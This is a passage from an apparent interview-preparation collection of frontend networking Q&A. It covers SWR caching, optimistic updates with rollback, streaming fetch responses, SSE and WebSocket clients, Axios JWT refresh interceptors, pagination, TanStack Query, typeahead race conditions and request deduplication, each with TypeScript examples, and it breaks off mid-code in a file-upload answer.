Increases latency for operations that fail repeatedly before succeeding, but ensures system survivability under load.

## Try This

Simulate 100 concurrent clients retrying with fixed intervals vs jittered exponential backoff and plot server request arrival distribution.

## Follow-ups

### What should the client inspect before calculating exponential backoff on HTTP 429 responses?

Inspect the Retry-After response header; if present, the client should respect the server's explicit waiting duration before applying local backoff.

## Citations

- https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/429

# How does the Stale-While-Revalidate (SWR) caching strategy work in modern client-side data fetching libraries?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Stale-While-Revalidate (SWR), derived from HTTP RFC 5861, is a caching strategy that prioritizes instant UI responsiveness while maintaining eventual data consistency. When a component requests data: 
1. **Stale:** The client immediately returns cached (potentially stale) data from memory if available, allowing the UI to render in 0ms without a loading spinner.
2. **Revalidate:** Simultaneously in the background, the client dispatches a network fetch to the backend authority.
3. **Update:** Once fresh data arrives, the client updates the cache and re-renders the UI seamlessly only if the data has changed.

```typescript
// Conceptual implementation of a memory-backed SWR Cache:
class SWRCache {
    private store = new Map<string, { data: any; timestamp: number }>();

    async get<T>(
        key: string,
        fetcher: () => Promise<T>,
        onUpdate: (data: T) => void
    ): Promise<T> {
        const cached = this.store.get(key);
        if (cached) {
            // Return stale data immediately for instant render!
            // Revalidate in background:
            fetcher().then(fresh => {
                if (JSON.stringify(fresh) !== JSON.stringify(cached.data)) {
                    this.store.set(key, { data: fresh, timestamp: Date.now() });
                    onUpdate(fresh); // Trigger update
                }
            }).catch(console.error);
            return cached.data;
        }

        // No cache: await initial network fetch
        const data = await fetcher();
        this.store.set(key, { data, timestamp: Date.now() });
        return data;
    }
}
```

**Complexity analysis and mechanics:**
- **Perceived latency:** 0ms instantaneous render on subsequent page views or tab focuses.
- **Structural Sharing:** Libraries like TanStack Query compare old and new data structures recursively, preserving unchanged object references to avoid unnecessary component re-renders.

**Algorithmic mechanics and edge cases:**
SWR libraries typically trigger automatic background revalidation on three key lifecycle events: **Window Focus** (when user returns from another tab), **Network Reconnection** (when user regains internet), and **Interval Polling**.

## Why

SWR delivers instantaneous zero-latency navigation while ensuring the interface synchronizes with backend updates in the background.

## Worked Case

Walkthrough scenario: A user navigates to their profile page. Without SWR, every navigation triggers a 300ms spinner. With SWR, the profile page renders cached user data in 0ms. In the background, SWR revalidates with the server, finds that the user's avatar URL updated 5 minutes ago, updates the cache, and smoothly updates the avatar image without flickering the rest of the page.

## Risk

Displaying stale cached data without a subtle background syncing indicator can mislead users on critical financial or inventory screens.

## Trade-off

Increases background network requests to keep cached views synchronized with the remote database.

## Try This

Implement a simple SWR hook and observe page rendering instantaneously from cache followed by a silent background data update.

## Follow-ups

### What is Structural Sharing in TanStack Query?

Structural sharing copies unchanged nested objects from the previous cache entry rather than creating new objects, preserving reference equality and preventing React re-renders.

## Citations

- https://swr.vercel.app/
- https://tanstack.com/query/latest/docs/framework/react/overview

# How do you implement optimistic UI updates with deterministic rollbacks when an asynchronous mutation fails?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Optimistic UI is a design pattern where the client updates its interface immediately upon user action, *assuming* the backend server mutation will succeed, rather than forcing the user to wait for an HTTP roundtrip. To remain truthful, the client must capture a snapshot of the previous state *before* applying the optimistic update. If the mutation rejects or times out, the client deterministically rolls back to the captured snapshot and presents an actionable error notification.

```typescript
interface Todo { id: string; text: string; completed: boolean; }

export async function toggleTodoOptimistic(
    todoId: string,
    getTodos: () => Todo[],
    setTodos: (todos: Todo[]) => void,
    apiToggle: (id: string) => Promise<void>
) {
    // 1. Snapshot previous authoritative state:
    const rollbackSnapshot = getTodos();

    // 2. Apply optimistic update immediately:
    setTodos(rollbackSnapshot.map(t =>
        t.id === todoId ? { ...t, completed: !t.completed } : t
    ));

    try {
        // 3. Dispatch server mutation in background:
        await apiToggle(todoId);
    } catch (error) {
        // 4. On failure: deterministic rollback to snapshot!
        console.error('Mutation failed, rolling back state:', error);
        setTodos(rollbackSnapshot);
        alert('Could not update todo. Changes reverted.');
    }
}
```

**Complexity analysis and mechanics:**
- **Interaction responsiveness:** 0ms perceived latency for user clicks.
- **Rollback guarantees:** State snapshot ensures partial network failures restore exact previous state without data corruption.

**Algorithmic mechanics and edge cases:**
Handling race conditions across concurrent optimistic mutations requires careful state queues. In TanStack Query, `onMutate` cancels in-flight query refetches (`cancelQueries`), snapshots the previous cache, updates the cache optimistically, and `onError` restores the snapshot context before `onSettled` re-synchronizes with the authoritative server.

## Why

Optimistic updates make applications feel instantaneous and responsive, emulating local desktop software speeds.

## Worked Case

Walkthrough scenario: A user marks an email as 'Archived'. The email disappears from the inbox in 0ms. The background POST /archive fails with a network timeout. The catch block executes: the archived email reappears in its exact position in the inbox, and an alert toast reads: 'Network error. Email could not be archived.' The interface remains completely truthful.

## Risk

Failing to snapshot and rollback on failure leaves the UI showing changes that never persisted to the database.

## Trade-off

Significantly higher state management complexity and error handling logic for every optimistic mutation.

## Try This

Implement an optimistic like button that rolls back when an API endpoint artificially rejects with a 500 error.

## Follow-ups

### Why is it important to cancel in-flight queries before applying an optimistic update?

If an older background query resolves after you apply the optimistic update, its stale response will overwrite your optimistic change before the mutation completes.

## Citations

- https://tanstack.com/query/latest/docs/framework/react/guides/optimistic-updates
- https://react.dev/reference/react/useOptimistic

# How do you consume and render a chunked streaming LLM response using Fetch ReadableStream and TextDecoder?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Modern generative AI backends stream text tokens incrementally over HTTP using chunked transfer encoding or Server-Sent Events. In the browser, `response.body` on a Fetch `Response` is a `ReadableStream<Uint8Array>`. To consume the stream without buffering the entire payload into memory, obtain a reader using `response.body.getReader()` and decode bytes into UTF-8 string chunks using `TextDecoder({ stream: true })` inside an asynchronous loop.

```typescript
export async function streamLLMResponse(
    prompt: string,
    signal: AbortSignal,
    onToken: (token: string) => void
): Promise<void> {
    const response = await fetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ prompt }),
        signal
    });

    if (!response.ok || !response.body) {
        throw new Error(`Streaming failed: HTTP ${response.status}`);
    }

    const reader = response.body.getReader();
    const decoder = new TextDecoder('utf-8');

    try {
        while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            // stream: true ensures multi-byte UTF-8 characters split across chunks decode correctly:
            const chunkText = decoder.decode(value, { stream: true });
            onToken(chunkText);
        }
    } finally {
        reader.releaseLock();
    }
}
```

**Complexity analysis and mechanics:**
- **Memory efficiency:** O(1) memory consumption; each byte buffer is garbage collected after decoding rather than accumulating in a single massive buffer.
- **Time to First Token (TTFT):** Delivers text to the screen within ~100ms of backend generation, rather than waiting 15 seconds for complete response generation.

**Algorithmic mechanics and edge cases:**
The `{ stream: true }` parameter in `decoder.decode()` is critical. A multi-byte character (like an emoji or Japanese kanji) can be split across two separate TCP network chunks. Without `{ stream: true }`, `TextDecoder` emits a corrupted replacement character `` instead of holding the partial bytes in reserve until the next chunk arrives.

## Why

Streaming reduces perceived latency from tens of seconds down to milliseconds for generative AI experiences.

## Worked Case

Walkthrough scenario: An AI code assistant generates a 500-line function. A standard JSON fetch forces the user to stare at a spinner for 20 seconds. Streaming with ReadableStream renders the function header, imports, and logic token-by-token within 150ms of generation. If the user realizes the prompt was misunderstood, they click Cancel, which aborts the reader immediately, saving backend GPU compute.

## Risk

Omitting { stream: true } causes multi-byte Unicode characters split across network packets to render as corrupted replacement glyphs.

## Trade-off

Requires progressive markdown rendering and state accumulation rather than a single simple JSON payload parse.

## Try This

Stream a long paragraph and log chunk lengths to observe that browser chunks vary in size depending on TCP packet arrival.

## Follow-ups

### Why is reader.releaseLock() called in a finally block?

getReader() locks the stream to that reader; if an error occurs, releasing the lock ensures the stream can be closed, cancelled, or read by another handler.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Using_readable_streams
- https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder/decode

# How do Server-Sent Events (SSE) compare with WebSockets for real-time frontend streaming, and how do you handle reconnects?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Server-Sent Events (SSE) and WebSockets provide real-time web capabilities with distinct architectural trade-offs:
- **Server-Sent Events (`EventSource`):** Unidirectional (server-to-client only), runs over standard HTTP/HTTPS (efficiently multiplexed over HTTP/2), natively supports automatic reconnection with backoff, supports message IDs (`id:`) for missed message replay, and traverses corporate proxies and firewalls without configuration.
- **WebSockets (`WebSocket`):** Full-duplex bidirectional (client-to-server and server-to-client), upgrades to a raw TCP socket protocol (`ws://`, `wss://`), requires custom application code for reconnection, ping/pong heartbeats, and message recovery.

```typescript
// 1. Native EventSource with automatic reconnection:
const sse = new EventSource('/api/live-feed');
sse.onmessage = (event) => {
    console.log('Received SSE message:', event.data, 'Event ID:', event.lastEventId);
};
sse.onerror = (err) => {
    console.warn('SSE connection dropped; browser will automatically reconnect...');
};

// 2. Fetch-based SSE parser (when custom Authorization headers are required):
async function fetchSSE(url: string, token: string, onEvent: (data: string) => void) {
    const response = await fetch(url, {
        headers: { 'Authorization': `Bearer ${token}`, 'Accept': 'text/event-stream' }
    });
    const reader = response.body!.getReader();
    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
        const { value, done } = await reader.read();
        if (done) break;
        buffer += decoder.decode(value, { stream: true });
        const lines = buffer.split('\n\n');
        buffer = lines.pop() || ''; // Keep partial line in buffer
        for (const block of lines) {
            if (block.startsWith('data: ')) onEvent(block.replace(/^data: /, ''));
        }
    }
}
```

**Complexity analysis and mechanics:**
- **HTTP/2 multiplexing:** Native EventSource shares the same single TCP connection as page assets under HTTP/2, whereas WebSockets require dedicated TCP connections.
- **Replay mechanism:** When reconnecting, the browser automatically sends `Last-Event-ID: <id>`, allowing the server to replay missed messages.

**Algorithmic mechanics and edge cases:**
The native browser `EventSource` API does not support passing custom HTTP headers (like `Authorization: Bearer <token>`). To send auth tokens over SSE, developers either pass tokens in URL query parameters (which risk proxy logging) or use `fetch` with `ReadableStream` to parse the SSE text protocol manually.

## Why

SSE provides automatic reconnection and HTTP/2 multiplexing for server-to-client streaming without WebSocket overhead.

## Worked Case

Walkthrough scenario: A financial stock ticker streams prices to 50,000 users. Because prices flow strictly server-to-client, the team chooses SSE over WebSockets. When a mobile user passes through a tunnel, the connection drops. Upon exiting the tunnel, the browser's EventSource automatically reconnects and sends Last-Event-ID: 4102. The server sends missed trades starting from 4103, restoring data consistency with zero custom reconnection code.

## Risk

Native EventSource cannot send custom Authorization headers, tempting developers to leak sensitive tokens in URL query strings.

## Trade-off

SSE is strictly unidirectional; bidirectional communication requires sending client data via separate HTTP POST requests.

## Try This

Connect to an SSE endpoint, terminate the server, and observe browser DevTools network tab automatically retrying the connection.

## Follow-ups

### What is the HTTP/1.1 connection limit problem with native EventSource?

HTTP/1.1 limits browsers to 6 concurrent connections per domain; opening 6 SSE tabs exhausts the connection pool entirely. HTTP/2 eliminates this restriction via multiplexing.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events
- https://html.spec.whatwg.org/multipage/server-sent-events.html

# How do you implement a robust WebSocket client with heartbeat ping-pong, reconnection backoff, and offline queueing?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** A production-grade WebSocket client must survive network drops, server restarts, and sleeping laptops. It requires three core pillars:
1. **Heartbeat (Ping/Pong):** Periodic ping frames to detect silent connection drops (TCP half-open states) where the socket is dead but the browser has not fired `onclose`.
2. **Exponential Reconnection Backoff:** Progressively backing off reconnection intervals with jitter to prevent server overload upon restart.
3. **Offline Message Queue:** Buffering messages sent while disconnected and flushing them in FIFO order once the socket transitions to `OPEN`.

```typescript
export class ResilientWebSocket {
    private ws: WebSocket | null = null;
    private queue: string[] = [];
    private pingTimer: number | null = null;
    private attempts = 0;

    constructor(private url: string, private onMessage: (msg: any) => void) {
        this.connect();
    }

    private connect() {
        this.ws = new WebSocket(this.url);
        this.ws.onopen = () => {
            this.attempts = 0;
            this.startHeartbeat();
            this.flushQueue();
        };
        this.ws.onmessage = (event) => {
            if (event.data === 'pong') return;
            this.onMessage(JSON.parse(event.data));
        };
        this.ws.onclose = () => this.handleDisconnect();
    }

    send(data: any) {
        const payload = JSON.stringify(data);
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(payload);
        } else {
            this.queue.push(payload); // Buffer offline!
        }
    }

    private flushQueue() {
        while (this.queue.length && this.ws?.readyState === WebSocket.OPEN) {
            this.ws.send(this.queue.shift()!);
        }
    }

    private startHeartbeat() {
        this.pingTimer = window.setInterval(() => {
            if (this.ws?.readyState === WebSocket.OPEN) this.ws.send('ping');
        }, 30000);
    }

    private handleDisconnect() {
        if (this.pingTimer) clearInterval(this.pingTimer);
        const delay = Math.min(10000, 500 * Math.pow(2, this.attempts)) + Math.random() * 500;
        this.attempts++;
        setTimeout(() => this.connect(), delay);
    }
}
```

**Complexity analysis and mechanics:**
- **State tracking:** `ws.readyState` transitions through `CONNECTING` (0), `OPEN` (1), `CLOSING` (2), `CLOSED` (3).
- **Buffer bounds:** The offline queue must enforce a maximum size limit (e.g. 500 messages) to prevent out-of-memory crashes during extended network outages.

**Algorithmic mechanics and edge cases:**
Mobile devices put background browser tabs into deep sleep, freezing timers. When the user returns, the connection is typically dead. Listening to `document.addEventListener('visibilitychange', ...)` and triggering an immediate ping/reconnect check when `document.visibilityState === 'visible'` revives the socket instantly.

## Why

Heartbeats detect silent connection drops and offline queues prevent message loss during transient network reconnects.

## Worked Case

Walkthrough scenario: A collaborative whiteboard app loses connection when a user walks into an elevator. The user continues drawing three shapes. The shapes enter this.queue. When the elevator doors open and 4G reconnects, onopen executes flushQueue(), transmitting all three shapes to the server without data loss or user intervention.

## Risk

Unbounded offline queues consume excessive memory during long network outages and overwhelm backends upon reconnect.

## Trade-off

Significantly higher client complexity than raw WebSocket APIs, requiring heartbeats, queues, and visibility listeners.

## Try This

Disable WiFi for 15 seconds while sending messages through ResilientWebSocket, restore WiFi, and verify messages flush in order.

## Follow-ups

### Why is document visibilitychange crucial for mobile WebSocket applications?

Mobile operating systems freeze timer execution in background tabs; listening to visibilitychange allows immediate socket health checks upon foregrounding.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/WebSocket
- https://developer.mozilla.org/en-US/docs/Web/API/Document/visibilitychange_event

# How do Axios request and response interceptors work, and how do you handle automatic JWT token refresh loops?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Axios interceptors are middleware functions that intercept HTTP requests before they are sent and HTTP responses before they are handled by application code. The most critical enterprise application of interceptors is **transparent JWT access token refresh**. When an API request fails with `401 Unauthorized`: 
1. The interceptor pauses the rejected request.
2. If a refresh is already in progress, subsequent requests subscribe to a pending promise queue rather than dispatching duplicate refresh calls.
3. Once the refresh token endpoint returns a fresh access token, the interceptor updates the failed request's `Authorization` header and replays it using the original Axios instance.

```typescript
import axios, { AxiosError, InternalAxiosRequestConfig } from 'axios';

export const apiClient = axios.create({ baseURL: '/api' });
let isRefreshing = false;
let failedQueue: Array<{
    resolve: (token: string) => void;
    reject: (err: any) => void;
}> = [];

const processQueue = (error: any, token: string | null = null) => {
    failedQueue.forEach(prom => error ? prom.reject(error) : prom.resolve(token!));
    failedQueue = [];
};

apiClient.interceptors.response.use(
    response => response,
    async (error: AxiosError) => {
        const originalRequest = error.config as InternalAxiosRequestConfig & { _retry?: boolean };
        if (error.response?.status === 401 && !originalRequest._retry) {
            if (isRefreshing) {
                // Queue requests while token refresh is in flight:
                return new Promise((resolve, reject) => {
                    failedQueue.push({ resolve, reject });
                }).then(token => {
                    originalRequest.headers.Authorization = `Bearer ${token}`;
                    return apiClient(originalRequest);
                });
            }

            originalRequest._retry = true;
            isRefreshing = true;

            try {
                const { data } = await axios.post('/api/auth/refresh');
                processQueue(null, data.accessToken);
                originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
                return apiClient(originalRequest);
            } catch (refreshErr) {
                processQueue(refreshErr, null);
                window.location.href = '/login'; // Session expired
                return Promise.reject(refreshErr);
            } finally {
                isRefreshing = false;
            }
        }
        return Promise.reject(error);
    }
);
```

**Complexity analysis and mechanics:**
- **Concurrency locking:** `isRefreshing` mutex lock ensures exactly 1 refresh request is dispatched, even if 15 parallel API calls trigger 401 simultaneously.
- **Infinite loop guard:** `_retry = true` flag prevents infinite 401 retry loops if the refresh token itself is expired or revoked.

**Algorithmic mechanics and edge cases:**
The refresh endpoint call itself (`axios.post('/api/auth/refresh')`) must use a separate vanilla Axios instance; using `apiClient` would trigger the 401 interceptor recursively if the refresh token fails.

## Why

A refresh queue handles token rotation seamlessly in the background without interrupting the user's active session.

## Worked Case

Walkthrough scenario: A user loads a dashboard with 6 widgets making parallel API calls. The user's access token expired 2 seconds ago. All 6 requests return 401. The first request triggers isRefreshing=true and calls /api/auth/refresh. The other 5 enter failedQueue. When the refresh returns a new token, processQueue resolves all 5 queued promises with the new token, and all 6 requests replay smoothly, displaying dashboard data without logging out the user.

## Risk

Failing to queue concurrent 401 requests triggers a barrage of simultaneous refresh calls that revoke single-use refresh tokens.

## Trade-off

Requires maintaining in-memory request queues and global mutex flags inside the API client module.

## Try This

Simulate 5 simultaneous API calls triggering 401 and verify that only 1 POST /refresh is sent while all 5 calls replay successfully.

## Follow-ups

### What happens if a refresh token rotation policy is enabled on the backend and 2 refresh requests are sent concurrently?

The backend revokes the entire token family as a potential token theft replay attack, logging out the user instantly.

## Citations

- https://axios-http.com/docs/interceptors
- https://auth0.com/docs/secure/tokens/refresh-tokens

# How do cursor-based and offset-based pagination differ in frontend infinite scroll implementations?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Pagination divides large datasets into manageable pages. In frontend infinite scroll applications, the choice between offset-based and cursor-based pagination fundamentally affects performance and data consistency:
- **Offset-based pagination (`limit=20&offset=40`):** Relies on skipping rows in the database. When new items are inserted at the top of the feed while the user is scrolling, the entire list shifts downward: items from page 1 spill into page 2, causing the user to see duplicate items on screen. Furthermore, database performance degrades to $O(N)$ as offset grows large.
- **Cursor-based pagination (`limit=20&cursor=item_9823`):** Uses a unique, indexed pointer (such as an opaque ID, timestamp, or base64 token) to fetch the next set of items *strictly after that cursor*. It is completely immune to item insertions or deletions at the top of the feed and executes in $O(1)$ indexed database time.

```typescript
interface PaginatedResponse<T> {
    items: T[];
    nextCursor: string | null;
}

export async function fetchFeedPage(cursor: string | null): Promise<PaginatedResponse<Post>> {
    const params = new URLSearchParams({ limit: '20' });
    if (cursor) params.set('cursor', cursor);
    const res = await fetch(`/api/feed?${params.toString()}`);
    if (!res.ok) throw new Error('Feed error');
    return res.json();
}
```

**Complexity analysis and mechanics:**
- **Frontend deduplication:** Even with cursor pagination, client feeds should maintain a Set of seen IDs (`seenIds.has(id)`) to guarantee zero duplicate keys in React lists.
- **IntersectionObserver:** An invisible sentinel `<div ref={sentinelRef} />` at the bottom of the list triggers the next page fetch when it enters the viewport.

**Algorithmic mechanics and edge cases:**
Cursor pagination cannot jump directly to arbitrary page numbers (e.g. 'Jump to Page 42'); it only supports sequential forward or backward traversal, making it ideal for infinite feeds and timelines (Twitter, Instagram, TikTok) rather than tabular data grids.

## Why

Cursor pagination guarantees consistent infinite scroll lists without duplicate or skipped items when new data is posted.

## Worked Case

Walkthrough scenario: A user scrolls an active social media feed. On offset pagination, after reading 20 posts, 5 new posts are published. The client requests offset=20. The last 5 posts from page 1 have shifted into indices 20-25, causing the user to see those 5 posts repeated on screen. With cursor=post_20, the database fetches rows created before post_20 regardless of new insertions, eliminating duplicates.

## Risk

Offset pagination produces duplicate entries and missing posts when items are inserted while the user is actively scrolling.

## Trade-off

Cursor pagination prevents jumping directly to arbitrary page numbers, limiting its use to sequential infinite lists.

## Try This

Prepend items to an offset-paginated mock API and observe the client list rendering duplicated rows across page boundaries.

## Follow-ups

### How do you detect when the user has scrolled to the bottom of an infinite list efficiently?

Use an IntersectionObserver attached to a sentinel element at the bottom of the list rather than listening to window onscroll events.

## Citations

- https://tanstack.com/query/latest/docs/framework/react/guides/infinite-queries
- https://slack.engineering/evolving-api-pagination-at-slack/

# How does cache query invalidation and optimistic mutation matching work in TanStack Query (React Query)?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** TanStack Query organizes cached asynchronous data using hierarchical array keys called **Query Keys** (e.g., `['todos', 'detail', todoId]`). Query invalidation (`queryClient.invalidateQueries({ queryKey })`) marks matching queries as stale and automatically refetches active queries in the background. Partial matching allows invalidating broad hierarchies (`['todos']` invalidates all todo lists and details) or specific targets (`['todos', 'list']`).

```typescript
import { useMutation, useQueryClient } from '@tanstack/react-query';

export function useAddTodo() {
    const queryClient = useQueryClient();

    return useMutation({
        mutationFn: (newTodo: { title: string }) => api.createTodo(newTodo),
        // 1. Optimistic update:
        onMutate: async (newTodo) => {
            await queryClient.cancelQueries({ queryKey: ['todos'] });
            const previousTodos = queryClient.getQueryData<Todo[]>(['todos']);
            queryClient.setQueryData<Todo[]>(['todos'], old => [
                ...(old || []),
                { id: 'temp-' + Date.now(), title: newTodo.title, completed: false }
            ]);
            return { previousTodos }; // Context snapshot
        },
        // 2. Rollback on error:
        onError: (err, newTodo, context) => {
            if (context?.previousTodos) {
                queryClient.setQueryData(['todos'], context.previousTodos);
            }
        },
        // 3. Always refetch authoritative server state on settlement:
        onSettled: () => {
            queryClient.invalidateQueries({ queryKey: ['todos'] });
        }
    });
}
```

**Complexity analysis and mechanics:**
- **Hierarchical matching:** Matching uses prefix comparison: `['todos']` matches `['todos']`, `['todos', 'list']`, and `['todos', 1]`.
- **Smart refetching:** Inactive queries (not currently rendered on screen) are marked stale but are NOT refetched until a component mounts and requests them.

**Algorithmic mechanics and edge cases:**
Query keys must be treated as deterministic serializations. If an object is used inside a query key (`['users', { filter: 'active' }]`), TanStack Query sorts object keys internally so that `{ a: 1, b: 2 }` and `{ b: 2, a: 1 }` match the identical cache entry.

## Why

Hierarchical query keys enable granular or bulk cache invalidation with automatic active-component synchronization.

## Worked Case

Walkthrough scenario: An application displays a user list and user count. Adding a user updates the database. Calling invalidateQueries({ queryKey: ['users'] }) matches both ['users', 'list'] and ['users', 'count'], triggering background refetches for both mounted widgets simultaneously, ensuring the list and count stay in complete synchronization.

## Risk

Mutating query key objects in place breaks cache lookup because TanStack Query relies on stable key hashing.

## Trade-off

Automates cache lifecycles at the expense of strict reliance on consistent query key naming conventions.

## Try This

Invalidate queryKey: ['users'] and verify that only currently mounted components trigger background network requests.

## Follow-ups

### What is the difference between staleTime and gcTime (formerly cacheTime) in TanStack Query?

staleTime defines how long data is considered fresh before needing revalidation; gcTime defines how long inactive data remains in memory before garbage collection.

## Citations

- https://tanstack.com/query/latest/docs/framework/react/guides/query-invalidation
- https://tanstack.com/query/latest/docs/framework/react/guides/query-keys

# How do you prevent race conditions when multiple fast-typing search requests are dispatched simultaneously?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In typeahead search inputs, network latency is non-deterministic: a slow request for a short query (`'ca'`) can resolve *after* a fast request for a longer query (`'cats'`), causing outdated results to overwrite the user's fresh search. To prevent this classic race condition, frontends combine three strategies:
1. **Abort prior requests:** Passing an `AbortController.signal` to cancel the previous in-flight request when a new character is typed.
2. **Sequential request IDs:** Maintaining an incrementing transaction ID or timestamp in a ref and discarding any response whose ID is older than the latest dispatched ID.
3. **Debouncing:** Delaying request dispatch by ~250ms of typing inactivity to eliminate intermediate requests.

```tsx
function TypeaheadSearch() {
    const [query, setQuery] = useState('');
    const [results, setResults] = useState<string[]>([]);
    const abortControllerRef = useRef<AbortController | null>(null);
    const latestRequestIdRef = useRef<number>(0);

    const handleSearch = (text: string) => {
        setQuery(text);
        // 1. Abort previous in-flight request:
        if (abortControllerRef.current) abortControllerRef.current.abort();
        const controller = new AbortController();
        abortControllerRef.current = controller;

        // 2. Increment transaction ID:
        const currentRequestId = ++latestRequestIdRef.current;

        fetch(`/api/search?q=${encodeURIComponent(text)}`, { signal: controller.signal })
            .then(res => res.json())
            .then(data => {
                // 3. Verify this response is still the latest one:
                if (currentRequestId === latestRequestIdRef.current) {
                    setResults(data);
                }
            })
            .catch(err => {
                if (err.name !== 'AbortError') console.error(err);
            });
    };

    return <input value={query} onChange={e => handleSearch(e.target.value)} />;
}
```

**Complexity analysis and mechanics:**
- **Bandwidth reduction:** Aborting prior requests saves client mobile data and frees backend search server threads.
- **Zero UI tearing:** Generation counter guarantees that only the user's most recent intention updates the DOM.

**Algorithmic mechanics and edge cases:**
Using RxJS `switchMap` or TanStack Query handles this automatically under the hood: when query keys change, `switchMap` unsubscribes from the prior observable, terminating the old stream.

## Why

Generation tracking and request aborting guarantee that delayed network responses never overwrite newer user queries.

## Worked Case

Walkthrough scenario: A user types 'react'. The request for 'r' takes 800ms due to database cold start. The request for 'react' hits cache in 50ms, rendering React documentation. At t=800ms, the response for 'r' arrives. Without generation tracking, the 50ms results are overwritten by 'r' results, leaving the user viewing results for 'r' while the input reads 'react'. Generation tracking rejects the 'r' response instantly.

## Risk

Without race condition guards, fast typers regularly end up with search results that don't match the text in the input box.

## Trade-off

Requires managing an AbortController ref and generation counter alongside standard input state.

## Try This

Simulate slow network latency on query 'a' (2000ms) and fast on 'ab' (100ms) and verify results reflect 'ab'.

## Follow-ups

### How does RxJS switchMap solve this problem natively?

switchMap automatically cancels and unsubscribes from the previous inner observable whenever a new value is emitted by the source stream.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/AbortController
- https://react.dev/learn/synchronizing-with-effects#fetching-data

# How do you implement request deduplication in flight so concurrent components don't trigger duplicate network calls?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** When multiple independent components on a page require the exact same dataset (e.g. Current User profile, Organization Settings, Feature Flags) on initial load, naive implementations dispatch identical duplicate HTTP requests simultaneously. **In-Flight Request Deduplication** caches the active `Promise` in memory keyed by request URL and parameters. When a second component requests the same resource while the first request is still in flight, it receives the *existing unresolved Promise*, resulting in exactly one network call that fulfills both callers simultaneously.

```typescript
export class RequestDeduplicator {
    private inFlight = new Map<string, Promise<any>>();

    async dedupe<T>(key: string, fetcher: () => Promise<T>): Promise<T> {
        // If identical request is already pending, return existing promise!
        const existing = this.inFlight.get(key);
        if (existing) return existing as Promise<T>;

        const promise = fetcher()
            .finally(() => {
                // Clean up once resolved or rejected so subsequent calls fetch fresh:
                this.inFlight.delete(key);
            });

        this.inFlight.set(key, promise);
        return promise;
    }
}

export const deduplicator = new RequestDeduplicator();

// Used across ComponentA, ComponentB, ComponentC:
// const user = await deduplicator.dedupe('/api/me', () => fetch('/api/me').then(r => r.json()));
```

**Complexity analysis and mechanics:**
- **Network reduction:** Collapses N concurrent component requests into exactly 1 HTTP transmission.
- **Memory lifecycle:** `.finally(() => inFlight.delete(key))` ensures in-flight cache holds zero references after completion, preventing memory leaks.

**Algorithmic mechanics and edge cases:**
If the in-flight request fails, the shared Promise rejects for all concurrent subscribers. Deleting the key in `.finally()` allows subsequent user retry attempts to dispatch a fresh network attempt.

## Why

Deduplicating in-flight requests eliminates redundant server load and network contention during initial dashboard rendering.

## Worked Case

Walkthrough scenario: An application dashboard has a Navbar, Sidebar, and MainProfile widget. All three mount at t=0 and request fetch('/api/user/me'). Without deduplication, 3 identical GET requests hit the backend, tripling session verification load. With RequestDeduplicator, Navbar creates the promise, Sidebar and MainProfile attach to it, and exactly 1 GET request is executed.

## Risk

Forgetting to delete the key in finally() permanently traps the endpoint in a resolved promise that never fetches fresh data.

## Trade-off

Only deduplicates requests occurring within the same in-flight time window; persistent caching requires SWR or TanStack Query.

## Try This

Call dedupe('/api/config') simultaneously from 5 separate components and verify the network tab shows exactly 1 HTTP request.

## Follow-ups

### How does React 19 native cache() function relate to request deduplication?

In Server Components, React's cache(fn) deduplicates identical function calls per server request, ensuring multiple components calling getUser() execute the database query only once.

## Citations

- https://tanstack.com/query/latest/docs/framework/react/guides/important-defaults
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/finally

# How do you handle file uploads with progress tracking, resumable multipart uploads, and drag-and-drop state?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The native Fetch API cannot track upload progress because `ReadableStream` upload support is limited across browsers. Reliable file uploads with percentage progress tracking require `XMLHttpRequest` and its `xhr.upload.onprogress` event. For large files (>50MB), enterprise frontends implement **Chunked / Resumable Uploads** (e.g. using the TUS protocol or S3 Multipart Upload), slicing the `File` using `file.slice(start, end)` into 5MB chunks and uploading them sequentially or in parallel with retry tokens.

```typescript
export function uploadWithProgress(
    url: string,
    file: File,
